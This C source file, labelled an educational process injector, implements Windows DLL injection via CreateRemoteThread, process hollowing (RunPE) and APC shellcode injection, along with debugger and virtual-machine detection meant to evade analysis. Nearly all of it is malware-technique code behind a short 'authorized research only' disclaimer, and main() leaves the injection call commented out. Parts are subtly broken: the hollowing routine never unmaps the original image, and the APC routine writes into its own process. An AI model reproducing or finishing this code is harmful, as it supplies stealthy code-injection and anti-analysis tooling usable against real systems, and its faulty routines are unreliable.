/*
 * Educational Process Injector
 * Demonstrates: Process hollowing, DLL injection, API hooking
 * FOR AUTHORIZED SECURITY RESEARCH ONLY
 */

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <string.h>

/* Technique 1: Classic DLL Injection */
BOOL inject_dll(DWORD process_id, const char* dll_path) {
    HANDLE h_process;
    LPVOID remote_buffer;
    HANDLE h_thread;
    HMODULE h_kernel32;
    LPTHREAD_START_ROUTINE load_library_addr;
    
    /* Open target process */
    h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_id);
    if (!h_process) {
        printf("[-] Failed to open process\n");
        return FALSE;
    }
    
    /* Allocate memory in target process */
    remote_buffer = VirtualAllocEx(h_process, NULL, strlen(dll_path) + 1,
                                   MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remote_buffer) {
        CloseHandle(h_process);
        return FALSE;
    }
    
    /* Write DLL path to remote process */
    if (!WriteProcessMemory(h_process, remote_buffer, dll_path,
                           strlen(dll_path) + 1, NULL)) {
        VirtualFreeEx(h_process, remote_buffer, 0, MEM_RELEASE);
        CloseHandle(h_process);
        return FALSE;
    }
    
    /* Get address of LoadLibraryA */
    h_kernel32 = GetModuleHandle("kernel32.dll");
    load_library_addr = (LPTHREAD_START_ROUTINE)GetProcAddress(h_kernel32, "LoadLibraryA");
    
    /* Create remote thread to load DLL */
    h_thread = CreateRemoteThread(h_process, NULL, 0, load_library_addr,
                                   remote_buffer, 0, NULL);
    if (!h_thread) {
        VirtualFreeEx(h_process, remote_buffer, 0, MEM_RELEASE);
        CloseHandle(h_process);
        return FALSE;
    }
    
    WaitForSingleObject(h_thread, INFINITE);
    
    /* Cleanup */
    VirtualFreeEx(h_process, remote_buffer, 0, MEM_RELEASE);
    CloseHandle(h_thread);
    CloseHandle(h_process);
    
    return TRUE;
}

/* Technique 2: Process Hollowing (RunPE) */
BOOL process_hollow(const char* target_process, const char* payload_path) {
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    CONTEXT ctx;
    LPVOID remote_image_base;
    HANDLE h_file;
    DWORD file_size;
    LPVOID local_image;
    PIMAGE_DOS_HEADER dos_header;
    PIMAGE_NT_HEADERS nt_headers;
    
    /* Create suspended target process */
    si.cb = sizeof(si);
    if (!CreateProcess(NULL, (LPSTR)target_process, NULL, NULL, FALSE,
                       CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return FALSE;
    }
    
    /* Read payload executable */
    h_file = CreateFile(payload_path, GENERIC_READ, FILE_SHARE_READ, NULL,
                       OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h_file == INVALID_HANDLE_VALUE) {
        TerminateProcess(pi.hProcess, 1);
        return FALSE;
    }
    
    file_size = GetFileSize(h_file, NULL);
    local_image = VirtualAlloc(NULL, file_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    ReadFile(h_file, local_image, file_size, NULL, NULL);
    CloseHandle(h_file);
    
    /* Parse PE headers */
    dos_header = (PIMAGE_DOS_HEADER)local_image;
    nt_headers = (PIMAGE_NT_HEADERS)((BYTE*)local_image + dos_header->e_lfanew);
    
    /* Unmap original executable */
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
    
    /* Allocate memory in target process */
    remote_image_base = VirtualAllocEx(pi.hProcess,
                                        (LPVOID)nt_headers->OptionalHeader.ImageBase,
                                        nt_headers->OptionalHeader.SizeOfImage,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    /* Write payload headers and sections */
    WriteProcessMemory(pi.hProcess, remote_image_base, local_image,
                       nt_headers->OptionalHeader.SizeOfHeaders, NULL);
    
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt_headers);
    for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
        WriteProcessMemory(pi.hProcess,
                           (LPVOID)((BYTE*)remote_image_base + section[i].VirtualAddress),
                           (LPVOID)((BYTE*)local_image + section[i].PointerToRawData),
                           section[i].SizeOfRawData, NULL);
    }
    
    /* Update entry point and resume */
    ctx.Eax = (DWORD)((BYTE*)remote_image_base + nt_headers->OptionalHeader.AddressOfEntryPoint);
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);
    
    /* Cleanup */
    VirtualFree(local_image, 0, MEM_RELEASE);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    return TRUE;
}

/* Technique 3: APC Injection */
BOOL apc_injection(DWORD thread_id, const char* shellcode, size_t shellcode_size) {
    HANDLE h_thread;
    LPVOID remote_buffer;
    
    /* Open target thread */
    h_thread = OpenThread(THREAD_ALL_ACCESS, FALSE, thread_id);
    if (!h_thread) return FALSE;
    
    /* Get handle to current process (simplified) */
    HANDLE h_process = GetCurrentProcess();
    
    /* Allocate and write shellcode */
    remote_buffer = VirtualAllocEx(h_process, NULL, shellcode_size,
                                   MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(h_process, remote_buffer, shellcode, shellcode_size, NULL);
    
    /* Queue APC to thread */
    QueueUserAPC((PAPCFUNC)remote_buffer, h_thread, 0);
    
    CloseHandle(h_thread);
    return TRUE;
}

/* Find target process by name */
DWORD find_process(const char* process_name) {
    HANDLE h_snapshot;
    PROCESSENTRY32 pe32;
    DWORD pid = 0;
    
    h_snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (h_snapshot == INVALID_HANDLE_VALUE) return 0;
    
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (Process32First(h_snapshot, &pe32)) {
        do {
            if (_stricmp(pe32.szExeFile, process_name) == 0) {
                pid = pe32.th32ProcessID;
                break;
            }
        } while (Process32Next(h_snapshot, &pe32));
    }
    
    CloseHandle(h_snapshot);
    return pid;
}

/* Evasion: Check for debugger */
BOOL is_debugged() {
    return IsDebuggerPresent() || CheckRemoteDebuggerPresent(GetCurrentProcess(), &(BOOL){0});
}

/* Evasion: Check for VM */
BOOL is_vm() {
    /* Check common VM indicators */
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    
    /* Single processor often indicates VM */
    if (si.dwNumberOfProcessors < 2) return TRUE;
    
    /* Check for VM-specific processes */
    if (find_process("vmtoolsd.exe") || find_process("vmwaretray.exe"))
        return TRUE;
    
    return FALSE;
}

int main(int argc, char* argv[]) {
    printf("[*] Educational Process Injector\n");
    printf("[!] For authorized security testing only\n\n");
    
    /* Evasion checks */
    if (is_debugged()) {
        printf("[-] Debugger detected, exiting\n");
        return 1;
    }
    
    if (is_vm()) {
        printf("[-] VM detected, may be analysis environment\n");
        /* Could exit here or take alternate path */
    }
    
    /* Example: Inject into notepad */
    DWORD target_pid = find_process("notepad.exe");
    
    if (target_pid) {
        printf("[+] Found target process: %lu\n", target_pid);
        
        /* Demonstrate DLL injection technique */
        // inject_dll(target_pid, "C:\\path\\to\\payload.dll");
        
        printf("[*] Injection would occur here in real malware\n");
    } else {
        printf("[-] Target process not found\n");
        printf("[*] Starting notepad for demonstration...\n");
        
        /* Start target process for demo */
        ShellExecute(NULL, "open", "notepad.exe", NULL, NULL, SW_SHOW);
        Sleep(1000);
        
        /* Retry injection */
        target_pid = find_process("notepad.exe");
        if (target_pid) {
            printf("[+] Target started, PID: %lu\n", target_pid);
        }
    }
    
    return 0;
}
